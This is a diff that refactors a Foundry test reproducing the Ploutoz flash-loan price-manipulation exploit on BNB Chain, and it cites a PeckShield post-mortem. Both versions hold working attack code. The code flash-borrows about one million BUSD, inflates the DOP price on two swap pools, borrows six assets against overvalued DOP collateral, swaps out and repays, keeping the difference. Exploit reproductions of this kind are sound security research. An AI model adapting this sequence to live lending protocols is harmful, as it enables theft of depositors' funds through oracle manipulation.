@@ -15,20 +15,23 @@ import "../interface.sol";
 
 // @Analysis
 // Post-mortem : https://x.com/peckshield/status/1463113809111896065
-// Twitter Guy : 
-// Hacking God : 
+// Twitter Guy :
+// Hacking God :
 pragma solidity ^0.8.0;
 
 interface ILoanToken {
     function borrow(
-        bytes32 loanId,                 
+        bytes32 loanId,
         uint256 withdrawAmount,
-        uint256 initialLoanDuration,    
-        uint256 collateralTokenSent,    
+        uint256 initialLoanDuration,
+        uint256 collateralTokenSent,
         address collateralTokenAddress,
         address borrower,
         address receiver,
-        bytes memory data) external payable;
+        bytes memory data
+    ) external payable;
+
+    function loanTokenAddress() external view returns (address);
 }
 
 contract Ploutoz is BaseTestWithBalanceLog {
@@ -50,122 +53,89 @@ contract Ploutoz is BaseTestWithBalanceLog {
 
     function setUp() public {
         vm.createSelectFork("bsc", blocknumToForkFrom);
-        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
         fundingToken = address(BUSD);
-    }
 
-    function testExploit() public balanceLog {
-        // vm.startPrank(0xCD8206410b55e278A9538071A69Ef9E185856D24);
-        //implement exploit code here
-        uint256 _amount0Out = 0;
-        uint256 _amount1Out = 1_000_400_000_000_000_000_000_000;
-        IUniswapV2Pair(PancakeSwap).swap(_amount0Out, _amount1Out, address(this), "X");
-    }
-
-    function pancakeCall(address sender, uint256 amount0Out, uint256 amount1Out, bytes memory data) external {
-        // vm.startPrank(0xCD8206410b55e278A9538071A69Ef9E185856D24);
         IERC20(BUSD).approve(TwindexSwapRouter, type(uint256).max);
         IERC20(DOP).approve(TwindexSwapRouter, type(uint256).max);
         IERC20(BUSD).approve(PancakeRouter, type(uint256).max);
 
-        uint256 amountIn;
-        uint256 amountOutMin;
+        IERC20(DOP).approve(pBUSD, type(uint256).max);
+        IERC20(DOP).approve(pUSDT, type(uint256).max);
+        IERC20(DOP).approve(pBTCB, type(uint256).max);
+        IERC20(DOP).approve(pWETH, type(uint256).max);
+        IERC20(DOP).approve(pDOLLY, type(uint256).max);
+        IERC20(DOP).approve(pCAKE, type(uint256).max);
+    }
+
+    function testExploit() public balanceLog {
+        uint256 _amount0Out = 0;
+        uint256 _amount1Out = 1_000_400.0 ether;
+        IUniswapV2Pair(PancakeSwap).swap(_amount0Out, _amount1Out, address(this), "X");
+
+        swapLoanedTokenToStables();
+    }
+
+    function swapLoanedTokenToStables() internal {
+        swapLoanedTokenToStable(pCAKE);
+        swapLoanedTokenToStable(pDOLLY);
+        swapLoanedTokenToStable(pWETH);
+        swapLoanedTokenToStable(pBTCB);
+        swapLoanedTokenToStable(pUSDT);
+    }
+
+    function pancakeCall(address sender, uint256 amount0Out, uint256 amount1Out, bytes memory data) external {
+        //Pump price of DOP in both pairs
+        swapTokenToToken(BUSD, DOP, 1_000_000 ether, TwindexSwapRouter);
+        swapTokenToToken(BUSD, DOP, 400 ether, PancakeRouter);
+
+        //Here we borrow the assets,using few DOP which is overvalued
+        borrowMultipleLoans();
+
+        //Swap enough DOP to payback flashloan and keep profit
+        swapTokenToToken(DOP, BUSD, 570_625_638_619_593_832_545_805, TwindexSwapRouter);
+
+        //Payback flashloan
+        IERC20(BUSD).transfer(PancakeSwap, 1_002_951.02 ether);
+    }
+
+    function borrowMultipleLoans() internal {
+        // CAKE loan
+        borrowSingleLoan(pCAKE, 85 ether, 50 ether);
+
+        // DOLLY loan
+        borrowSingleLoan(pDOLLY, 18_000 ether, 500.0 ether);
+
+        // WETH loan
+        borrowSingleLoan(pWETH, 18 ether, 1900 ether);
+
+        // BTCB loan
+        borrowSingleLoan(pBTCB, 1.6 ether, 2000 ether);
+
+        // USDT loan
+        borrowSingleLoan(pUSDT, 89_000 ether, 2000 ether);
+
+        // BUSD loan
+        borrowSingleLoan(pBUSD, 90_000 ether, 2000 ether);
+    }
+
+    function swapLoanedTokenToStable(address lToken) internal {
+        address assetIn = ILoanToken(lToken).loanTokenAddress();
+        uint256 amountIn = TokenHelper.getTokenBalance(assetIn, address(this));
+        swapTokenToToken(assetIn, BUSD, amountIn, PancakeRouter);
+    }
+
+    function swapTokenToToken(address tokenIn, address tokenOut, uint256 amountIn, address router) internal {
+        if (amountIn == 0) return;
+        IERC20(tokenIn).approve(router, type(uint256).max);
         address[] memory path = new address[](2);
-        uint256 deadline;
+        path[0] = tokenIn;
+        path[1] = tokenOut;
+        Uni_Router_V2(router).swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
+    }
 
-        amountIn = 1_000_000_000_000_000_000_000_000;
-        amountOutMin = 0;
-        path[0] = BUSD;
-        path[1] = DOP;
-        deadline = 1_637_659_447;
-        Uni_Router_V2(TwindexSwapRouter).swapExactTokensForTokens(amountIn, amountOutMin, path, address(this), deadline);
-
-        amountIn = 400_000_000_000_000_000_000; 
-        amountOutMin = 0;
-        path[0] = BUSD;
-        path[1] = DOP;
-        deadline = 1_637_659_447;
-        Uni_Router_V2(PancakeRouter).swapExactTokensForTokens(amountIn, amountOutMin, path, address(this), deadline);
-
-        IERC20(DOP).approve(0xc9eaC733e69C7F02B4320f1C2E25a76a770EDfEb, type(uint).max);
-        IERC20(DOP).approve(pBUSD, type(uint).max);
-        IERC20(DOP).approve(pUSDT, type(uint).max);
-        IERC20(DOP).approve(pBTCB, type(uint).max);
-        IERC20(DOP).approve(pWETH, type(uint).max);
-        IERC20(DOP).approve(pDOLLY, type(uint).max);
-        IERC20(DOP).approve(pCAKE, type(uint).max);
-
-        bytes32 loanId;            
-        uint256 withdrawAmount;
-        uint256 initialLoanDuration;    
-        uint256 collateralTokenSent;    
-        address collateralTokenAddress;
-        address borrower;
-        address receiver;
-
-        loanId = bytes32(0x0000000000000000000000000000000000000000000000000000000000000000);
-        withdrawAmount = 85_000_000_000_000_000_000;
-        initialLoanDuration = 7_200;
-        collateralTokenSent = 50_000_000_000_000_000_000;
-        collateralTokenAddress = DOP;
-        borrower = address(this);
-        receiver = address(this);
-        ILoanToken(pCAKE).borrow(loanId, withdrawAmount, initialLoanDuration, collateralTokenSent, collateralTokenAddress, borrower, receiver, "");
-
-        loanId = bytes32(0x0000000000000000000000000000000000000000000000000000000000000000);
-        withdrawAmount = 18_000_000_000_000_000_000_000;
-        initialLoanDuration = 7_200;
-        collateralTokenSent = 500_000_000_000_000_000_000;
-        collateralTokenAddress = DOP;
-        borrower = address(this);
-        receiver = address(this);
-        ILoanToken(pDOLLY).borrow(loanId, withdrawAmount, initialLoanDuration, collateralTokenSent, collateralTokenAddress, borrower, receiver, "");
-
-        loanId = bytes32(0x0000000000000000000000000000000000000000000000000000000000000000);
-        withdrawAmount = 18_000_000_000_000_000_000;
-        initialLoanDuration = 7_200;
-        collateralTokenSent = 1_900_000_000_000_000_000_000;
-        collateralTokenAddress = DOP;
-        borrower = address(this);
-        receiver = address(this);
-        ILoanToken(pWETH).borrow(loanId, withdrawAmount, initialLoanDuration, collateralTokenSent, collateralTokenAddress, borrower, receiver, "");
-
-        loanId = bytes32(0x0000000000000000000000000000000000000000000000000000000000000000);
-        withdrawAmount = 1_600_000_000_000_000_000;
-        initialLoanDuration = 7_200;
-        collateralTokenSent = 2_000_000_000_000_000_000_000;
-        collateralTokenAddress = DOP;
-        borrower = address(this);
-        receiver = address(this);
-        ILoanToken(pBTCB).borrow(loanId, withdrawAmount, initialLoanDuration, collateralTokenSent, collateralTokenAddress, borrower, receiver, "");
-
-        loanId = bytes32(0x0000000000000000000000000000000000000000000000000000000000000000);
-        withdrawAmount = 89_000_000_000_000_000_000_000;
-        initialLoanDuration = 7_200;
-        collateralTokenSent = 2_000_000_000_000_000_000_000;
-        collateralTokenAddress = DOP;
-        borrower = address(this);
-        receiver = address(this);
-        ILoanToken(pUSDT).borrow(loanId, withdrawAmount, initialLoanDuration, collateralTokenSent, collateralTokenAddress, borrower, receiver, "");
-
-        loanId = bytes32(0x0000000000000000000000000000000000000000000000000000000000000000);
-        withdrawAmount = 90_000_000_000_000_000_000_000;
-        initialLoanDuration = 7_200;
-        collateralTokenSent = 2_000_000_000_000_000_000_000;
-        collateralTokenAddress = DOP;
-        borrower = address(this);
-        receiver = address(this);
-        ILoanToken(pBUSD).borrow(loanId, withdrawAmount, initialLoanDuration, collateralTokenSent, collateralTokenAddress, borrower, receiver, "");
-
-        amountIn = 570_625_638_619_593_832_545_805;
-        amountOutMin = 0;
-        path[0] = DOP;
-        path[1] = BUSD;
-        deadline = 1_637_659_447;
-        Uni_Router_V2(TwindexSwapRouter).swapExactTokensForTokens(amountIn, amountOutMin, path, address(this), deadline);
-
-        uint256 amount = 1_002_951_020_000_000_000_000_000;
-        IERC20(BUSD).transfer(PancakeSwap, amount);
-        // vm.stopPrank();
+    function borrowSingleLoan(address token, uint256 withdrawAmount, uint256 collateralTokenSent) internal {
+        ILoanToken(token).borrow(
+            bytes32(0), withdrawAmount, 7200, collateralTokenSent, DOP, address(this), address(this), ""
+        );
     }
 }
